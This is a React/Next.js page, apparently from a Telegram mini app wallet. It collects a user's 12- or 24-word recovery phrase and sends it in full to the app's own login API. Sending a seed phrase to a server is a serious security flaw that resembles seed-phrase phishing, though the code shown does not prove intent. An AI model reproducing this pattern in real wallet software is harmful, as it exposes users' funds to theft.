"use client";

import { Page } from "@/components/Page";
import { Button, Input, Title } from "@telegram-apps/telegram-ui";
import { useRouter } from "next/navigation";
import { useState } from "react";


export default function AuthPage() {
	const router = useRouter();
	const [wordCount, setWordCount] = useState(24);
	const [words, setWords] = useState<string[]>(Array(24).fill(""));
	const [error, setError] = useState<string | null>(null);
	const [isLoading, setIsLoading] = useState(false);

	const inputs = Array.from({ length: wordCount }, (_, i) => i + 1);

	const handleWordChange = (index: number, value: string) => {
		const newWords = [...words];
		newWords[index] = value.trim();
		setWords(newWords);
		setError(null);
	};

	const isFormValid = words
		.slice(0, wordCount)
		.every((word) => word.length > 0);

	const handleSubmit = async () => {
		try {
			setIsLoading(true);
			setError(null);
			console.log("[Client] Starting login process");
			console.log("[Client] Submitting mnemonics:", { wordCount, wordsLength: words.length });

			const response = await fetch('/api/auth/login', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({
					mnemonics: words.slice(0, wordCount)
				}),
			});

			console.log("[Client] Response status:", response.status);
			const data = await response.json();
			console.log("[Client] Response data:", data);

			if (!response.ok) {
				throw new Error(data.error || 'Failed to login');
			}

			console.log('[Client] Login successful:', {
				address: data.address,
				balanceLength: data.balance?.length
			});
			localStorage.setItem('wallet', JSON.stringify({ address: data.address, balance: data.balance }));
			router.push('/wallet');
			
		} catch (err) {
			console.error("[Client] Login error:", err);
			setError(err instanceof Error ? err.message : 'Something went wrong');
		} finally {
			setIsLoading(false);
		}
	};

	return (
		<Page back={true}>
			<div className="container mx-auto px-6 py-12 max-w-4xl">
				<Title weight="2" className="mb-4 text-center text-3xl text-tg-text">
					Enter your recovery phrase
				</Title>
				<Title
					weight="3"
					className="mb-5 text-center text-lg text-tg-text text-gray-400"
				>
					Please enter your recovery phrase to access your wallet.
				</Title>

				<div className="flex justify-center gap-2 mb-6">
					<Button
						size="m"
						onClick={() => setWordCount(24)}
						className={`${
							wordCount === 24
								? "bg-blue-500 text-white"
								: "bg-gray-700 text-gray-300"
						}`}
					>
						24 words
					</Button>
					<Button
						size="m"
						onClick={() => setWordCount(12)}
						className={`${
							wordCount === 12
								? "bg-blue-500 text-white"
								: "bg-gray-700 text-gray-300"
						}`}
					>
						12 words
					</Button>
				</div>

				<div>
					<div className="grid grid-cols-2 gap-4">
						{inputs.map((number) => (
							<Input
								key={number}
								placeholder={`${number}`}
								autoComplete="off"
								value={words[number - 1]}
								onChange={(e) => handleWordChange(number - 1, e.target.value)}
							/>
						))}
					</div>
				</div>

				{error && (
					<div className="mt-4 text-center text-red-500">
						{error}
					</div>
				)}

				<div className="flex justify-center mt-6">
					<Button
						size="m"
						disabled={!isFormValid || isLoading}
						onClick={async () => {
							await handleSubmit();
						}}
						className={(!isFormValid || isLoading) ? "opacity-50" : ""}
					>
						{isLoading ? "Loading..." : "Submit"}
					</Button>
					<Button
						size="m"
						onClick={() => setWords(Array(wordCount).fill(""))}
						className="ml-4"
					>
						Clear
					</Button>
				</div>
			</div>
		</Page>
	);
}
